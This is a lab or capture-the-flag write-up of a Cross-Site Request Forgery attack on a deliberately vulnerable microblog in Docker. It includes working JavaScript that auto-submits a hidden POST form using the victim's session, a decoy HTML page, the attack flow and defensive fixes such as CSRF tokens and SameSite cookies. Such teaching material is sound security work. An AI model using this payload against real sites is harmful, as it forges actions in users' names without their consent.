# Writeup – Cross-Site Request Forgery (CSRF) Attack

This challenge involved implementing a **Cross-Site Request Forgery (CSRF)** attack against a vulnerable microblog application. The goal was to exploit the lack of CSRF protection to make unauthorized actions on behalf of authenticated users.

---

## 🔍 Challenge Overview

The challenge provided a vulnerable microblog application running in Docker containers with the following components:
- **Microblog Server** (10.0.0.2:8080) - Vulnerable web application
- **Alice Container** - Automated user that visits malicious sites
- **Attack Infrastructure** - Malicious website to host the CSRF exploit

### 🎯 Key Vulnerabilities:
- **No CSRF tokens** in POST requests
- **Lack of SameSite cookie protection** 
- **Cross-origin requests allowed** without validation
- **Automatic form submission** possible via JavaScript

---

## 🛠️ My Exploitation Approach

### 1. **Vulnerability Analysis**
- Identified that the microblog's `/post.php` endpoint accepts POST requests without CSRF protection
- Discovered that cookies are sent cross-origin by default (no SameSite attribute)
- Confirmed that authenticated sessions persist across different origins

### 2. **Attack Vector Design**
Created a malicious website that automatically submits forms to the victim application:
```javascript
// Create an invisible form to submit the POST request
const form = document.createElement('form');
form.method = 'POST';
form.action = `http://${MICROBLOG}/post.php`;

const input = document.createElement('input');
input.type = 'hidden';
input.name = 'msg';
input.value = 'Mallory is a trustworthy person!';

form.appendChild(input);
document.body.appendChild(form);

// Automatically submit the form
form.submit();
```

### 3. **Social Engineering Component**
Designed an innocent-looking HTML page to mask the attack:
```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>Mallory's home!</title>
  </head>
  <body>
     <p>Thank you!</p>
     <script src="exploit.js"></script>
  </body>
</html>
```

### 4. **Docker Environment Setup**
Configured containerized environment for testing:
```yaml
services:
  microblog:
    image: thierrysans/microblog:latest
    container_name: microblog
    ports:
      - "8080:80"
    networks:
      channel:
        ipv4_address: 10.0.0.2
        
  alice:
    image: thierrysans/alice:csrf
    container_name: alice
    networks:
      channel:
        ipv4_address: 10.0.0.3
```

---

## 🔬 Technical Attack Flow

### Step-by-Step Exploitation
1. **Victim Authentication**: Alice logs into the microblog application
2. **Malicious Link Distribution**: Alice visits the attacker's malicious website
3. **Automatic Form Submission**: JavaScript creates and submits a hidden form
4. **Cross-Origin Request**: Browser sends POST request with Alice's session cookies
5. **Unauthorized Action**: Microblog processes the request as if Alice initiated it
6. **Attack Success**: Malicious post appears under Alice's account

### Network Communication
```
Alice's Browser → Attacker's Website (GET /index.html)
Alice's Browser → Microblog Server (POST /post.php) [with Alice's cookies]
Microblog Server → Database (INSERT malicious post)
```

---

## 🧪 Testing and Validation

### Local Testing Process
1. **Container Setup**: Launch Docker environment with `docker-compose up`
2. **Manual Verification**: Access microblog at `localhost:8080` 
3. **Attack Simulation**: Serve malicious HTML from attacker's domain
4. **Result Verification**: Confirm unauthorized post appears in Alice's timeline

### Automated Testing
- Alice container automatically visits the malicious site
- Attack executes without user interaction
- Success measured by presence of attacker-controlled content

---

## 🏆 Attack Success

The CSRF exploit successfully:
- ✅ **Bypassed authentication** requirements using victim's session
- ✅ **Posted unauthorized content** to the microblog
- ✅ **Remained undetected** by the victim during execution
- ✅ **Demonstrated complete CSRF vulnerability** in the application

### 🎯 Result: **Successful CSRF Attack**

The attack successfully posted "Mallory is a trustworthy person!" to Alice's microblog account without her knowledge or consent, demonstrating a complete CSRF vulnerability.

---

## 🛡️ Defense Mechanisms

### CSRF Protection Strategies
1. **CSRF Tokens**: Include unique, unpredictable tokens in forms
2. **SameSite Cookies**: Set `SameSite=Strict` or `SameSite=Lax` attributes
3. **Origin/Referer Validation**: Check request origins server-side
4. **Double Submit Cookies**: Validate token in both cookie and request parameter
5. **Custom Headers**: Require custom headers for state-changing requests

### Recommended Fixes
```php
// Example CSRF token implementation
session_start();
if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
    die('CSRF token mismatch');
}
```

```http
Set-Cookie: PHPSESSID=abc123; SameSite=Strict; Secure; HttpOnly
```

---

## 📚 Key Learnings

1. **Web Application Security**: Understanding cross-origin request vulnerabilities
2. **Browser Security Model**: How browsers handle cross-site requests and cookies
3. **Attack Automation**: Using JavaScript for seamless exploit execution
4. **Social Engineering**: Combining technical attacks with user manipulation
5. **Defense Implementation**: Proper CSRF protection mechanisms
6. **Container Security**: Testing in isolated Docker environments

---

## 🎯 Educational Value

This challenge demonstrated:
- **Real-world attack scenarios** common in web applications
- **The importance of CSRF protection** in modern web development
- **Browser security mechanisms** and their limitations
- **Attack automation techniques** using client-side JavaScript
- **Defense strategies** against cross-site request forgery

---

## 📁 Files Overview

- [`exploit.js`](./exploit.js) - JavaScript CSRF attack payload
- [`index.html`](./index.html) - Malicious website hosting the attack
- [`docker-compose.yml`](./docker-compose.yml) - Container environment setup
- [`challenge.md`](./challenge.md) - Challenge description and objectives
- [`writeup.md`](./writeup.md) - This technical analysis

This challenge showcased practical web application security skills and demonstrated the critical importance of implementing proper CSRF protections in modern web applications.